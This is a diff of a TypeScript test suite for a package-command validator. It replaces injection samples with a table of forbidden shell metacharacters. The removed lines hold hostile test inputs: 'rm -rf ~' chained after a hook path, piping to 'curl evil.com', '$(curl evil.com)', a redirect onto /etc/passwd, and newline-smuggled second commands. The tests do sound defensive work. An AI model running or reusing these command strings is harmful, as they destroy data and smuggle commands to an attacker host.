@@ -100,21 +100,28 @@ describe("validatePackageCommand", () => {
 		expect(validatePackageCommand(`${repoDir}/../../../bin/rm`, repoDir)).toBeUndefined();
 	});
 
-	it("rejects shell metacharacters even when path looks safe", () => {
-		expect(validatePackageCommand(`${repoDir}/hooks/audit.sh; rm -rf ~`, repoDir)).toBeUndefined();
-		expect(validatePackageCommand(`${repoDir}/hooks/audit.sh | curl evil.com`, repoDir)).toBeUndefined();
-		expect(validatePackageCommand(`$(curl evil.com)`, repoDir)).toBeUndefined();
-		expect(validatePackageCommand(`\`whoami\``, repoDir)).toBeUndefined();
-		expect(validatePackageCommand(`${repoDir}/hooks/run.sh && bad`, repoDir)).toBeUndefined();
-		expect(validatePackageCommand(`${repoDir}/hooks/x.sh > /etc/passwd`, repoDir)).toBeUndefined();
-	});
+	// One assertion per forbidden character. `bash -c` interprets all of these,
+	// so the validator must reject the command even when the leading path looks
+	// safe. Newline/CR are included because bash executes each line separately.
+	const FORBIDDEN_CHARS: ReadonlyArray<readonly [string, string]> = [
+		["semicolon", ";"],
+		["ampersand", "&"],
+		["pipe", "|"],
+		["less-than", "<"],
+		["greater-than", ">"],
+		["backtick", "`"],
+		["dollar-sign", "$"],
+		["open-paren", "("],
+		["close-paren", ")"],
+		["backslash", "\\"],
+		["open-brace", "{"],
+		["close-brace", "}"],
+		["newline", "\n"],
+		["carriage-return", "\r"],
+	];
 
-	it("rejects newline-smuggled second commands (multiline injection)", () => {
-		// `bash -c` executes every line; the first-token path check alone is not
-		// sufficient because it inspects only `/pkg/root/safe.sh` and the second
-		// line still runs.
-		expect(validatePackageCommand(`${repoDir}/safe.sh\nrm -rf ~`, repoDir)).toBeUndefined();
-		expect(validatePackageCommand(`${repoDir}/safe.sh\r\necho injected`, repoDir)).toBeUndefined();
+	it.each(FORBIDDEN_CHARS)("rejects shell metacharacter %s (%j)", (_label, ch) => {
+		expect(validatePackageCommand(`${repoDir}/safe.sh${ch}injected`, repoDir)).toBeUndefined();
 	});
 
 	it("rejects empty / whitespace-only commands", () => {
